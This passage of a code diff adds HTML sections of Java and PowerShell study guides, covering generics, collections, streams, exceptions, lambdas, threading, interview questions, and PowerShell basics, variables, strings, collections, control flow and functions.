+        if (x &lt; 0 || y &lt; 0) throw new IllegalArgumentException("Negative coords");
+    }
+
+    // Custom method
+    public double distanceTo(Point other) {
+        return Math.hypot(other.x - this.x, other.y - this.y);
+    }
+}
+</code></pre>
+
+`,
+  "study-guide-java-09": `
+<h2>9. Generics</h2>
+<pre><code>// Generic class
+public class Box&lt;T&gt; {
+    private T value;
+
+    public Box(T value) { this.value = value; }
+    public T getValue() { return value; }
+
+    @Override
+    public String toString() {
+        return "Box&lt;" + value.getClass().getSimpleName() + "&gt;(" + value + ")";
+    }
+}
+
+Box&lt;Integer&gt; intBox = new Box&lt;&gt;(42);
+Box&lt;String&gt;  strBox = new Box&lt;&gt;("Hello");
+
+// Generic method
+public static &lt;T extends Comparable&lt;T&gt;&gt; T max(T a, T b) {
+    return a.compareTo(b) &gt;= 0 ? a : b;
+}
+
+// Wildcards
+public static double sumList(List&lt;? extends Number&gt; list) {
+    return list.stream().mapToDouble(Number::doubleValue).sum();
+}
+// &lt;? extends T&gt;  — can read, not write (covariant)
+// &lt;? super T&gt;    — can write, not read as T (contravariant)
+// &lt;?&gt;            — unknown type (read as Object only)
+
+// Bounded type parameters
+public &lt;T extends Comparable&lt;T&gt; &amp; Serializable&gt; void store(T item) { ... }
+</code></pre>
+
+`,
+  "study-guide-java-10": `
+<h2>10. Collections Framework</h2>
+<pre><code>import java.util.*;
+import java.util.stream.*;
+
+// List (ordered, allows duplicates)
+List&lt;String&gt; list = new ArrayList&lt;&gt;();
+list.add("apple");
+list.add("banana");
+list.add(0, "cherry");     // Insert at index
+list.set(1, "mango");      // Replace
+list.get(0);               // "cherry"
+list.remove(0);            // By index
+list.remove("banana");     // By value
+list.size();
+list.contains("mango");
+list.indexOf("mango");
+list.isEmpty();
+list.clear();
+list.sort(Comparator.naturalOrder());
+list.sort(Comparator.reverseOrder());
+list.sort(Comparator.comparing(String::length));
+Collections.sort(list);
+Collections.shuffle(list);
+Collections.reverse(list);
+Collections.min(list);
+Collections.max(list);
+list.subList(1, 3);        // View (not a copy!)
+list.toArray(new String[0]);
+List.of("a", "b", "c");   // Immutable list (Java 9+)
+List.copyOf(other);        // Immutable copy
+
+// LinkedList (doubly linked — efficient head/tail ops)
+LinkedList&lt;String&gt; queue = new LinkedList&lt;&gt;();
+queue.addFirst("front");
+queue.addLast("back");
+queue.removeFirst();
+queue.removeLast();
+queue.peek();              // View first without removing
+
+// Stack
+Deque&lt;Integer&gt; stack = new ArrayDeque&lt;&gt;();
+stack.push(1);
+stack.push(2);
+stack.pop();               // 2
+stack.peek();              // 1 (without removing)
+
+// Queue
+Queue&lt;String&gt; queue2 = new LinkedList&lt;&gt;();
+queue2.offer("first");
+queue2.offer("second");
+queue2.poll();             // "first" (removes)
+queue2.peek();             // "second" (doesn't remove)
+
+// PriorityQueue (min-heap by default)
+PriorityQueue&lt;Integer&gt; pq = new PriorityQueue&lt;&gt;();
+PriorityQueue&lt;Integer&gt; maxPQ = new PriorityQueue&lt;&gt;(Comparator.reverseOrder());
+pq.offer(5); pq.offer(1); pq.offer(3);
+pq.poll();   // 1 (smallest)
+
+// Set (no duplicates)
+Set&lt;String&gt; set = new HashSet&lt;&gt;();       // O(1) ops, unordered
+Set&lt;String&gt; ordered = new TreeSet&lt;&gt;();   // Sorted, O(log n)
+Set&lt;String&gt; linked = new LinkedHashSet&lt;&gt;(); // Insertion order
+
+set.add("apple");
+set.contains("apple");    // true
+set.remove("apple");
+set.size();
+Set.of("a", "b", "c");   // Immutable
+
+// Set operations
+Set&lt;Integer&gt; a = new HashSet&lt;&gt;(Arrays.asList(1,2,3,4));
+Set&lt;Integer&gt; b = new HashSet&lt;&gt;(Arrays.asList(3,4,5,6));
+Set&lt;Integer&gt; union = new HashSet&lt;&gt;(a); union.addAll(b);         // {1,2,3,4,5,6}
+Set&lt;Integer&gt; intersect = new HashSet&lt;&gt;(a); intersect.retainAll(b); // {3,4}
+Set&lt;Integer&gt; diff = new HashSet&lt;&gt;(a); diff.removeAll(b);        // {1,2}
+
+// Map (key-value pairs, no duplicate keys)
+Map&lt;String, Integer&gt; map = new HashMap&lt;&gt;();  // O(1) avg, unordered
+Map&lt;String, Integer&gt; sorted = new TreeMap&lt;&gt;();  // Sorted by key
+Map&lt;String, Integer&gt; linked = new LinkedHashMap&lt;&gt;(); // Insertion order
+
+map.put("one", 1);
+map.put("two", 2);
+map.get("one");               // 1
+map.getOrDefault("three", 0); // 0
+map.containsKey("one");       // true
+map.containsValue(1);         // true
+map.remove("one");
+map.size();
+map.isEmpty();
+map.putIfAbsent("two", 99);   // Only put if key absent
+map.computeIfAbsent("list", k -&gt; new ArrayList&lt;&gt;());
+map.merge("count", 1, Integer::sum);  // Add if absent, merge if present
+
+// Iteration
+for (Map.Entry&lt;String, Integer&gt; entry : map.entrySet()) {
+    System.out.println(entry.getKey() + " = " + entry.getValue());
+}
+map.forEach((k, v) -&gt; System.out.println(k + " = " + v));
+map.keySet();
+map.values();
+map.entrySet();
+Map.of("a", 1, "b", 2);   // Immutable (Java 9+, max 10 entries)
+Map.copyOf(other);
+
+// Utility methods
+Collections.unmodifiableList(list);
+Collections.synchronizedList(list);
+Collections.frequency(list, "apple");
+Collections.nCopies(5, "x");    // ["x","x","x","x","x"]
+Collections.disjoint(set1, set2); // true if no common elements
+</code></pre>
+
+`,
+  "study-guide-java-11": `
+<h2>11. Streams API</h2>
+<pre><code>import java.util.stream.*;
+
+List&lt;Integer&gt; numbers = List.of(1, 2, 3, 4, 5, 6, 7, 8, 9, 10);
+
+// Creating streams
+numbers.stream()                    // From collection
+Arrays.stream(arr)                  // From array
+Stream.of(1, 2, 3)                  // From values
+Stream.empty()
+IntStream.range(0, 10)             // 0 to 9
+IntStream.rangeClosed(1, 10)       // 1 to 10
+Stream.generate(() -&gt; "hello").limit(5)
+Stream.iterate(0, n -&gt; n + 2).limit(10) // 0,2,4,6,8,10,12,14,16,18
+Stream.iterate(0, n -&gt; n &lt; 100, n -&gt; n + 2)  // With predicate (Java 9)
+
+// Intermediate operations (lazy — return a new Stream)
+.filter(n -&gt; n % 2 == 0)           // Keep only evens
+.map(n -&gt; n * 2)                   // Transform each
+.mapToInt(String::length)          // To primitive stream
+.mapToDouble(n -&gt; n * 1.0)
+.flatMap(list -&gt; list.stream())    // Flatten nested streams
+.distinct()                        // Remove duplicates
+.sorted()                          // Sort (natural order)
+.sorted(Comparator.reverseOrder()) // Custom sort
+.limit(5)                          // Take first 5
+.skip(2)                           // Skip first 2
+.peek(n -&gt; System.out.println(n))  // Side effect for debugging
+.takeWhile(n -&gt; n &lt; 5)            // Java 9
+.dropWhile(n -&gt; n &lt; 5)            // Java 9
+
+// Terminal operations (eager — trigger the pipeline)
+.collect(Collectors.toList())
+.collect(Collectors.toSet())
+.collect(Collectors.toUnmodifiableList())
+.collect(Collectors.joining(", ", "[", "]"))
+.collect(Collectors.groupingBy(String::length))
+.collect(Collectors.partitioningBy(n -&gt; n % 2 == 0))
+.collect(Collectors.counting())
+.collect(Collectors.summingInt(Integer::intValue))
+.collect(Collectors.averagingDouble(n -&gt; n))
+.collect(Collectors.toMap(k -&gt; k, v -&gt; v.length()))
+
+.forEach(System.out::println)
+.count()
+.findFirst()          // Returns Optional
+.findAny()            // May be faster in parallel
+.anyMatch(n -&gt; n &gt; 5)
+.allMatch(n -&gt; n &gt; 0)
+.noneMatch(n -&gt; n &lt; 0)
+.min(Comparator.naturalOrder())   // Returns Optional
+.max(Comparator.naturalOrder())   // Returns Optional
+.sum()                // IntStream, LongStream, DoubleStream only
+.average()            // Returns OptionalDouble
+.summaryStatistics()  // Count, sum, min, max, avg
+.reduce(0, Integer::sum)
+.reduce((a, b) -&gt; a + b)    // Returns Optional
+.toArray()
+
+// Practical examples
+List&lt;String&gt; names = List.of("Alice", "Bob", "Charlie", "David", "Eve");
+
+// Filter, sort, collect
+List&lt;String&gt; result = names.stream()
+    .filter(n -&gt; n.length() &gt; 3)
+    .sorted()
+    .collect(Collectors.toList());
+
+// Map to uppercase
+List&lt;String&gt; upper = names.stream()
+    .map(String::toUpperCase)
+    .collect(Collectors.toList());
+
+// Count by length
+Map&lt;Integer, Long&gt; byLength = names.stream()
+    .collect(Collectors.groupingBy(String::length, Collectors.counting()));
+
+// Find longest name
+Optional&lt;String&gt; longest = names.stream()
+    .max(Comparator.comparing(String::length));
+
+longest.ifPresent(System.out::println);
+longest.orElse("None");
+longest.orElseGet(() -&gt; "None");
+longest.orElseThrow(() -&gt; new RuntimeException("No names"));
+
+// Parallel streams
+long count = numbers.parallelStream()
+    .filter(n -&gt; isPrime(n))
+    .count();
+</code></pre>
+
+`,
+  "study-guide-java-12": `
+<h2>12. Exception Handling</h2>
+<pre><code>// Checked exceptions: must be declared or handled
+// Unchecked exceptions: extend RuntimeException, optional handling
+
+// try-catch-finally
+try {
+    int result = Integer.parseInt("not a number");
+    FileReader fr = new FileReader("nonexistent.txt");
+} catch (NumberFormatException e) {
+    System.err.println("Number format error: " + e.getMessage());
+} catch (FileNotFoundException e) {
+    System.err.println("File not found: " + e.getMessage());
+} catch (IOException | IllegalArgumentException e) {
+    // Multi-catch (Java 7+)
+    e.printStackTrace();
+} finally {
+    System.out.println("Always executes");
+}
+
+// Try-with-resources (auto-closes)
+try (FileReader fr = new FileReader("file.txt");
+     BufferedReader br = new BufferedReader(fr)) {
+    String line;
+    while ((line = br.readLine()) != null) {
+        System.out.println(line);
+    }
+} catch (IOException e) {
+    e.printStackTrace();
+}
+
+// Custom exceptions
+public class AppException extends RuntimeException {
+    private final String code;
+
+    public AppException(String message, String code) {
+        super(message);
+        this.code = code;
+    }
+
+    public AppException(String message, String code, Throwable cause) {
+        super(message, cause);
+        this.code = code;
+    }
+
+    public String getCode() { return code; }
+}
+
+// Throw exceptions
+void validateAge(int age) {
+    if (age &lt; 0) throw new IllegalArgumentException("Age cannot be negative");
+    if (age &gt; 150) throw new IllegalArgumentException("Age unrealistically large");
+}
+
+// Exception hierarchy
+// Throwable
+//   Error (don't catch: OutOfMemoryError, StackOverflowError)
+//   Exception
+//     IOException (checked)
+//     SQLException (checked)
+//     RuntimeException (unchecked)
+//       NullPointerException
+//       ArrayIndexOutOfBoundsException
+//       IllegalArgumentException
+//       IllegalStateException
+//       UnsupportedOperationException
+//       ArithmeticException
+//       ClassCastException
+//       NumberFormatException
+//       ConcurrentModificationException
+</code></pre>
+
+`,
+  "study-guide-java-13": `
+<h2>13. Functional Interfaces and Lambdas</h2>
+<pre><code>import java.util.function.*;
+
+// Functional interfaces (one abstract method)
+Predicate&lt;String&gt; isEmpty = s -&gt; s.isEmpty();
+Predicate&lt;Integer&gt; isEven = n -&gt; n % 2 == 0;
+isEven.test(4);              // true
+isEven.negate();             // Opposite predicate
+isEven.and(n -&gt; n &gt; 0);     // Both must be true
+isEven.or(n -&gt; n &lt; 0);      // Either must be true
+
+Function&lt;String, Integer&gt; length = s -&gt; s.length();
+Function&lt;String, String&gt; trim = String::trim;
+length.apply("hello");       // 5
+length.andThen(n -&gt; n * 2);  // Compose
+trim.compose(String::toLowerCase);  // Apply first, then trim
+
+Consumer&lt;String&gt; print = System.out::println;
+BiConsumer&lt;String, Integer&gt; printPair = (s, n) -&gt; System.out.println(s + ": " + n);
+print.accept("Hello");
+print.andThen(s -&gt; System.out.println("Done"));
+
+Supplier&lt;List&lt;String&gt;&gt; listFactory = ArrayList::new;
+listFactory.get();           // New ArrayList each call
+
+BiFunction&lt;Integer, Integer, Integer&gt; add = (a, b) -&gt; a + b;
+add.apply(3, 4);             // 7
+
+UnaryOperator&lt;String&gt; upper = String::toUpperCase;
+BinaryOperator&lt;Integer&gt; max = Integer::max;
+
+// Method references
+// Static: ClassName::staticMethod
+Function&lt;String, Integer&gt; parser = Integer::parseInt;
+// Instance on fixed object: instance::method
+String prefix = "Hello ";
+Function&lt;String, String&gt; greet = prefix::concat;
+// Instance on parameter type: ClassName::instanceMethod
+Function&lt;String, String&gt; upper2 = String::toUpperCase;
+// Constructor: ClassName::new
+Supplier&lt;ArrayList&lt;String&gt;&gt; newList = ArrayList::new;
+Function&lt;String, StringBuilder&gt; newSB = StringBuilder::new;
+
+// Comparator with lambdas
+List&lt;String&gt; names = Arrays.asList("Charlie", "Alice", "Bob");
+names.sort((a, b) -&gt; a.compareTo(b));
+names.sort(Comparator.naturalOrder());
+names.sort(Comparator.comparingInt(String::length));
+names.sort(Comparator.comparingInt(String::length).thenComparing(Comparator.naturalOrder()));
+names.sort(Comparator.reverseOrder());
+</code></pre>
+
+`,
+  "study-guide-java-14": `
+<h2>14. Optional</h2>
+<pre><code>// Avoid NullPointerException
+Optional&lt;String&gt; opt = Optional.of("hello");      // Must be non-null
+Optional&lt;String&gt; maybe = Optional.ofNullable(str); // Null safe
+Optional&lt;String&gt; empty = Optional.empty();
+
+opt.isPresent()              // true
+opt.isEmpty()                // false (Java 11+)
+opt.get()                    // "hello" (throws if empty)
+opt.orElse("default")        // "default" if empty
+opt.orElseGet(() -&gt; compute()) // Lazy evaluation
+opt.orElseThrow()            // Throw NoSuchElementException if empty
+opt.orElseThrow(() -&gt; new AppException("Not found"))
+
+opt.map(String::toUpperCase)             // Optional&lt;String&gt;
+opt.flatMap(s -&gt; Optional.of(s + "!"))   // When mapping returns Optional
+opt.filter(s -&gt; s.length() &gt; 3)          // Optional or empty
+opt.ifPresent(System.out::println)       // Action if present
+opt.ifPresentOrElse(System.out::println, () -&gt; System.out.println("Empty"))
+opt.stream()                             // Stream of 0 or 1 elements
+</code></pre>
+
+`,
+  "study-guide-java-15": `
+<h2>15. Multithreading Basics</h2>
+<pre><code>// Creating threads
+// 1. Extend Thread
+class MyThread extends Thread {
+    @Override public void run() {
+        System.out.println("Thread: " + Thread.currentThread().getName());
+    }
+}
+new MyThread().start();
+
+// 2. Implement Runnable (preferred)
+Runnable task = () -&gt; System.out.println("Running!");
+Thread t = new Thread(task, "MyThread");
+t.start();
+t.join();           // Wait for thread to finish
+t.join(1000);       // Wait up to 1 second
+
+// Thread states: NEW → RUNNABLE → (BLOCKED/WAITING/TIMED_WAITING) → TERMINATED
+
+// ExecutorService (preferred over raw threads)
+ExecutorService executor = Executors.newFixedThreadPool(4);
+executor.execute(() -&gt; doWork());             // Submit Runnable
+Future&lt;Integer&gt; future = executor.submit(() -&gt; compute());  // Submit Callable
+Integer result = future.get();                // Block and get result
+future.get(5, TimeUnit.SECONDS);             // With timeout
+executor.shutdown();
+executor.awaitTermination(10, TimeUnit.SECONDS);
+
+// Thread-safe collections
+ConcurrentHashMap&lt;String, Integer&gt; concurrentMap = new ConcurrentHashMap&lt;&gt;();
+CopyOnWriteArrayList&lt;String&gt; cowList = new CopyOnWriteArrayList&lt;&gt;();
+BlockingQueue&lt;String&gt; blockingQueue = new LinkedBlockingQueue&lt;&gt;();
+AtomicInteger counter = new AtomicInteger(0);
+counter.incrementAndGet();
+counter.compareAndSet(expected, newValue);
+
+// synchronized
+public synchronized void increment() { count++; }
+synchronized (lock) { // Block-level synchronization
+    count++;
+}
+
+// volatile (visibility guarantee only, not atomicity)
+private volatile boolean running = true;
+</code></pre>
+
+`,
+  "study-guide-java-16": `
+<h2>16. Java Interview Questions</h2>
+<p><strong>Q: What is the difference between <code>==</code> and <code>.equals()</code> in Java?</strong>
+A: <code>==</code> compares object references (memory addresses). <code>.equals()</code> compares content/value. For strings, always use <code>.equals()</code>. Primitives should use <code>==</code>.</p>
+<p><strong>Q: What is the difference between an abstract class and an interface?</strong>
+A: Abstract classes can have state (fields), constructors, and both abstract and concrete methods. A class can only extend one abstract class. Interfaces can only have constants and method signatures (plus default/static methods in Java 8+). A class can implement multiple interfaces.</p>
+<p><strong>Q: What is autoboxing?</strong>
+A: Automatic conversion between primitive types (<code>int</code>, <code>double</code>) and their wrapper class counterparts (<code>Integer</code>, <code>Double</code>). Can cause performance issues and <code>NullPointerException</code> if unboxing a <code>null</code> wrapper.</p>
+<p><strong>Q: What is the difference between <code>ArrayList</code> and <code>LinkedList</code>?</strong>
+A: <code>ArrayList</code> uses a dynamic array — fast random access O(1), slow insert/delete in middle O(n). <code>LinkedList</code> uses a doubly-linked list — slow random access O(n), fast insert/delete at ends O(1).</p>
+<p><strong>Q: What is the difference between <code>HashMap</code> and <code>Hashtable</code>?</strong>
+A: <code>HashMap</code> is not synchronized (not thread-safe) and allows one <code>null</code> key. <code>Hashtable</code> is synchronized (thread-safe) but slower, and doesn't allow <code>null</code> keys. Use <code>ConcurrentHashMap</code> for thread-safe needs.</p>
+<p><strong>Q: What is a <code>checked</code> vs <code>unchecked</code> exception?</strong>
+A: Checked exceptions (like <code>IOException</code>) extend <code>Exception</code> directly and must be declared in the method signature or caught. Unchecked exceptions (like <code>NullPointerException</code>) extend <code>RuntimeException</code> and don't need to be declared.</p>
+<p><strong>Q: What are Java Streams?</strong>
+A: A declarative API for processing collections of data. Streams are lazy (nothing executes until a terminal operation is called), can be parallelized easily, and support functional-style operations like <code>map</code>, <code>filter</code>, and <code>reduce</code>.</p>
+
+<p><em>End of Java Study Guide</em></p>
+
+`,
+  "study-guide-powershell-01": `
+<h2>1. What Is PowerShell?</h2>
+<p>PowerShell is a <strong>cross-platform task automation framework</strong> consisting of a command-line shell, a scripting language, and a configuration management framework. Unlike traditional shells (bash, cmd) that work with text, <strong>PowerShell works with .NET objects</strong> — piping structured data instead of raw text strings.</p>
+<p>Originally Windows-only (Windows PowerShell, v1-5.1), now cross-platform as <strong>PowerShell 7+</strong> (formerly PowerShell Core).</p>
+<p>Key uses: system administration, automation, DevOps, Active Directory, Azure/AWS cloud management, Windows configuration.</p>
+
+`,
+  "study-guide-powershell-02": `
+<h2>2. PowerShell Basics</h2>
+<pre><code># Get help
+Get-Help Get-Process
+Get-Help Get-Process -Full
+Get-Help Get-Process -Examples
+Get-Help Get-Process -Online
+Update-Help                          # Download latest help
+
+# Discover commands
+Get-Command
+Get-Command -Verb Get
+Get-Command -Noun Process
+Get-Command -Module ActiveDirectory
+Get-Command *firewall*
+
+# Explore objects
+Get-Process | Get-Member             # Show all properties and methods
+Get-Process | Select-Object -First 1 | Format-List *  # All properties
+
+# Version and environment
+$PSVersionTable                      # PowerShell version info
+$Host.Version
+$env:OS
+$env:COMPUTERNAME
+$env:USERNAME
+$env:USERPROFILE
+$env:PATH
+
+# Execution Policy
+Get-ExecutionPolicy
+Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
+# Unrestricted, RemoteSigned, AllSigned, Restricted, Bypass
+
+# Profiles
+$PROFILE                             # Path to your profile script
+Test-Path $PROFILE
+New-Item -Path $PROFILE -Type File -Force
+notepad $PROFILE                     # Edit profile
+</code></pre>
+
+`,
+  "study-guide-powershell-03": `
+<h2>3. Cmdlet Naming Convention</h2>
+<p>PowerShell uses <strong>Verb-Noun</strong> naming:</p>
+<pre><code># Common verbs
+Get-*      # Retrieve data
+Set-*      # Change settings
+New-*      # Create new items
+Remove-*   # Delete items
+Add-*      # Add to a collection
+Clear-*    # Remove content
+Copy-*     # Duplicate items
+Move-*     # Move items
+Rename-*   # Rename items
+Start-*    # Begin a process/service
+Stop-*     # End a process/service
+Restart-*  # Stop then start
+Enable-*   # Turn on
+Disable-*  # Turn off
+Test-*     # Test/check something
+Invoke-*   # Execute something
+Import-*   # Import from external
+Export-*   # Export to external
+Out-*      # Send output somewhere
+Format-*   # Format output
+Convert-*  # Convert between types
+Select-*   # Select part of data
+Sort-*     # Sort data
+Where-*    # Filter data
+ForEach-*  # Iterate
+Measure-*  # Calculate metrics
+Compare-*  # Compare objects
+Write-*    # Write to output streams
+Read-*     # Read from input
+</code></pre>
+
+`,
+  "study-guide-powershell-04": `
+<h2>4. Variables</h2>
+<pre><code># Variable names start with $ — case-insensitive
+$name = "Alice"
+$age = 25
+$pi = 3.14
+$active = $true           # NOT just true
+$nothing = $null
+
+# Type constraints
+[int]$count = 0
+[string]$text = "hello"
+[double]$price = 9.99
+[datetime]$date = "2024-01-15"
+[bool]$flag = $false
+[array]$list = @(1,2,3)
+[hashtable]$map = @{}
+
+# Multiple assignment
+$a = $b = $c = 0
+$x, $y, $z = 1, 2, 3
+
+# Swap
+$a, $b = $b, $a
+
+# Read-Only / Constant
+New-Variable -Name "MAX" -Value 100 -Option ReadOnly
+New-Variable -Name "PI" -Value 3.14159 -Option Constant
+
+# Variable cmdlets
+Get-Variable                        # List all variables
+Get-Variable -Name "name"
+Set-Variable -Name "count" -Value 5
+Remove-Variable -Name "temp"
+Clear-Variable -Name "count"        # Set to null
+
+# Automatic variables
+$_           # Current object in pipeline
+$PSItem      # Same as $_
+$$           # Last token of last command
+$?           # Success status of last command (bool)
+$^           # First token of last command
+$args        # Arguments array
+$Error       # Array of recent errors
+$Error[0]    # Most recent error
+$LastExitCode # Exit code of last native command
+$null        # Null value
+$true, $false
+$home        # User's home directory
+$env:*       # Environment variables
+$PID         # Current process ID
+$PSCommandPath  # Full path of script
+$PSScriptRoot   # Directory of script
+$MyInvocation   # Script invocation details
+$input          # Piped input to a function/script
+$PSDefaultParameterValues  # Default parameter values
+</code></pre>
+
+`,
+  "study-guide-powershell-05": `
+<h2>5. Data Types and Strings</h2>
+<pre><code># Strings
+$s = "Hello, World!"
+$s = 'Single quotes (no interpolation)'
+
+# String interpolation (double quotes only)
+$name = "Alice"
+"Hello, $name!"               # "Hello, Alice!"
+"She said \`"hello\`""          # Escape with backtick
+"Tab:\`there"                  # Tab character
+"New\`nLine"                   # Newline
+
+# Here-strings (multi-line)
+$text = @"
+    This is a
+    multi-line string with $name interpolated
+    and "quotes" work fine
+"@
+
+$literal = @'
+    No $interpolation here
+    Everything is literal
+'@
+
+# String methods (all .NET methods available)
+$s.Length                     # 13
+$s.ToUpper()                  # "HELLO, WORLD!"
+$s.ToLower()
+$s.Trim()
+$s.TrimStart()
+$s.TrimEnd()
+$s.Replace("World", "PS")
+$s.Split(", ")                # Array
+$s.Contains("World")          # True
+$s.StartsWith("Hello")        # True
+$s.EndsWith("!")              # True
+$s.IndexOf("World")           # 7
+$s.Substring(7, 5)            # "World"
+$s.PadLeft(20)
+$s.PadRight(20, '*')
+[string]::Join(", ", @("a","b","c"))  # "a, b, c"
+-join @("a", "b", "c")              # "abc"
+"hello" -join ", "                   # Not the same! Left side must be array
+
+# String operators
+"Hello" + " World"           # Concatenation
+"ab" * 3                     # "ababab"
+"Hello" -eq "hello"          # True (case-insensitive by default)
+"Hello" -ceq "hello"         # False (case-sensitive)
+"Hello" -ne "World"          # True
+"hello" -like "hel*"         # Wildcard match
+"hello" -notlike "hel*"      # False
+"hello" -match "^h.l"        # Regex match (True) and populates $Matches
+"hello" -replace "l", "L"    # "heLLo" (regex replace)
+"heLLo" -creplace "[A-Z]","x" # Case-sensitive replace
+$Matches[0]                   # Full match from -match
+$Matches[1]                   # First capture group
+"hello" -in "hello","world"  # True (membership)
+"hello" -notin "world","foo" # True
+
+# Format strings
+"Hello, {0}! You are {1} years old." -f $name, $age
+"{0:C}" -f 1234.56           # "$1,234.56" (currency)
+"{0:N2}" -f 3.14159          # "3.14"
+"{0:P}" -f 0.853             # "85.30%"
+"{0:X}" -f 255               # "FF"
+"{0:D8}" -f 42               # "00000042"
+</code></pre>
+
+`,
+  "study-guide-powershell-06": `
+<h2>6. Numbers and Math</h2>
+<pre><code># Numeric types
+$int   = 42
+$long  = 9999999999
+$float = 3.14
+$hex   = 0xFF                # 255
+$binary = 0b11111111         # 255 (PS 6+)
+$kb    = 1KB                 # 1024
+$mb    = 1MB                 # 1048576
+$gb    = 1GB
+$tb    = 1TB
+
+# Arithmetic
+5 + 3; 5 - 3; 5 * 3; 5 / 3; 5 % 3
+[Math]::Pow(2, 10)           # 1024
+[Math]::Sqrt(16)             # 4
+[Math]::Abs(-5)              # 5
+[Math]::Round(3.14, 1)       # 3.1
+[Math]::Floor(3.9)           # 3
+[Math]::Ceiling(3.1)         # 4
+[Math]::Max(5, 10)           # 10
+[Math]::Min(5, 10)           # 5
+[Math]::Log(100, 10)         # 2
+[Math]::PI
+[Math]::E
+
+# Comparison operators
+-eq  -ne  -lt  -le  -gt  -ge    # Equal, not equal, less, etc.
+-and  -or  -not  -xor
+!                               # Same as -not
+</code></pre>
+
+`,
+  "study-guide-powershell-07": `
+<h2>7. Arrays and Collections</h2>
+<pre><code># Arrays
+$arr = @(1, 2, 3, 4, 5)
+$arr = 1, 2, 3, 4, 5         # Comma creates arrays
+$empty = @()
+$single = @(1)               # Force single-element array
+$range = 1..10               # [1,2,3,...,10]
+$letters = 'a'..'z'          # ['a','b',...,'z']
+
+# Access
+$arr[0]                      # 1 (first)
+$arr[-1]                     # 5 (last)
+$arr[0..2]                   # [1,2,3] (slice)
+$arr[-3..-1]                 # [3,4,5] (last 3)
+$arr[0,2,4]                  # [1,3,5] (specific indices)
+
+# Modification (creates new array!)
+$arr += 6                    # Append (inefficient — creates new array)
+$arr = $arr[0..3]            # Remove last element
+
+# Properties and methods
+$arr.Length                  # 5
+$arr.Count                   # 5
+$arr.Contains(3)             # True
+$arr.IndexOf(3)              # 2
+[array]::Reverse($arr)       # Reverse in place
+[array]::Sort($arr)          # Sort in place
+$arr | Sort-Object           # Sort (returns new array)
+$arr | Sort-Object -Descending
+$arr | Where-Object { $_ -gt 3 }   # Filter
+$arr | ForEach-Object { $_ * 2 }   # Transform
+$arr | Measure-Object -Sum  # Statistics
+($arr | Measure-Object -Sum).Sum
+$arr | Select-Object -First 3
+$arr | Select-Object -Last 2
+$arr | Select-Object -Unique
+
+# ArrayList (more efficient for adding/removing)
+$list = [System.Collections.ArrayList]@()
+$list.Add("item1")
+$list.Add("item2")
+$list.Remove("item1")
+$list.RemoveAt(0)
+$list.Insert(0, "new first")
+$list.Count
+
+# Generic List (strongly typed)
+$list = [System.Collections.Generic.List[string]]::new()
+$list.Add("hello")
+$list.Contains("hello")
+
+# Hashtables (key-value pairs)
+$hash = @{
+    Name    = "Alice"
+    Age     = 25
+    Active  = $true
+}
+
+$hash["Name"]                # "Alice"
+$hash.Name                   # "Alice" (dot notation)
+$hash["City"] = "NYC"        # Add key
+$hash.Remove("City")         # Remove key
+$hash.ContainsKey("Name")    # True
+$hash.ContainsValue("Alice") # True
+$hash.Keys
+$hash.Values
+$hash.Count
+
+# Ordered hashtable
+$ordered = [ordered]@{
+    First  = 1
+    Second = 2
+    Third  = 3
+}
+
+# Hashtable operations
+$hash.GetEnumerator() | Sort-Object -Property Name
+$hash + @{Email = "alice@example.com"}   # Merge (creates new)
+
+# Splatting (pass hashtable as parameters)
+$params = @{
+    ComputerName = "Server01"
+    Credential   = $cred
+}
+Get-Process @params
+</code></pre>
+
+`,
+  "study-guide-powershell-08": `
+<h2>8. Control Flow</h2>
+<pre><code># if / elseif / else
+if ($score -ge 90) {
+    Write-Output "A"
+} elseif ($score -ge 80) {
+    Write-Output "B"
+} else {
+    Write-Output "F"
+}
+
+# Switch
+switch ($day) {
+    "Monday"    { "Start of week" }
+    "Friday"    { "End of week" }
+    { $_ -in "Saturday","Sunday" } { "Weekend" }
+    default     { "Midweek" }
+}
+
+# Switch with regex
+switch -Regex ($text) {
+    "^\\d+"   { "Starts with numbers" }
+    "^[A-Z]" { "Starts with uppercase" }
+}
+
+# Switch with file input
+switch -File "data.txt" {
+    "error" { Write-Warning $_ }
+    default { Write-Output $_ }
+}
+
+# for
+for ($i = 0; $i -lt 10; $i++) {
+    Write-Output $i
+}
+
+# foreach
+foreach ($item in $collection) {
+    Write-Output $item
+}
+
+$numbers | ForEach-Object {
+    $_ * 2
+}
+# ForEach-Object shorthand (PS 3+)
+$numbers | ForEach-Object -MemberName ToString
+1..10 | % { $_ * 2 }   # % is alias for ForEach-Object
+
+# while
+$i = 0
+while ($i -lt 10) {
+    $i++
+}
+
+# do-while
+do {
+    $input = Read-Host "Enter number"
+} while ($input -notmatch "^\\d+$")
+
+# do-until
+do {
+    $tries++
+} until ($success -or $tries -gt 5)
+
+# Loop control
+break               # Exit loop
+continue            # Next iteration
+
+# Parallel ForEach (PS 7+)
+1..10 | ForEach-Object -Parallel {
+    Start-Sleep -Milliseconds 100
+    $_
+} -ThrottleLimit 5
+</code></pre>
+
+`,
+  "study-guide-powershell-09": `
+<h2>9. Functions</h2>
+<pre><code># Basic function
+function Get-Greeting {
+    param (
+        [string]$Name = "World",
+        [int]$Times = 1
+    )
+    for ($i = 0; $i -lt $Times; $i++) {
+        "Hello, $Name!"
+    }
+}
+Get-Greeting -Name "Alice" -Times 3
+Get-Greeting "Alice"   # Positional
+
+# Advanced functions (with CmdletBinding)
+function New-User {
+    [CmdletBinding(SupportsShouldProcess, ConfirmImpact='Medium')]
+    param (
+        [Parameter(Mandatory, ValueFromPipeline, ValueFromPipelineByPropertyName)]
+        [ValidateNotNullOrEmpty()]
+        [string]$Name,
+
+        [Parameter(Mandatory)]
+        [ValidateSet("Admin", "User", "Guest")]
+        [string]$Role,
+
+        [Parameter()]
+        [ValidateRange(1, 100)]
+        [int]$Age,
+
+        [Parameter()]
+        [ValidatePattern("^[\\w.-]+@[\\w.-]+\\.\\w{2,}$")]
+        [string]$Email,
+
+        [Parameter()]
+        [ValidateScript({ Test-Path $_ })]
+        [string]$ProfilePath,
+
+        [switch]$PassThru
+    )
+
+    begin {
+        Write-Verbose "Starting New-User function"
+    }
+
+    process {
+        if ($PSCmdlet.ShouldProcess($Name, "Create user")) {
+            $user = [PSCustomObject]@{
+                Name  = $Name
+                Role  = $Role
+                Age   = $Age
+                Email = $Email
+            }
+            Write-Verbose "Created user: $Name"
+
+            if ($PassThru) { $user }
+        }
+    }
+
+    end {
+        Write-Verbose "Completed New-User function"
+    }
+}
+
+# Usage
+New-User -Name "Alice" -Role "Admin" -Age 25
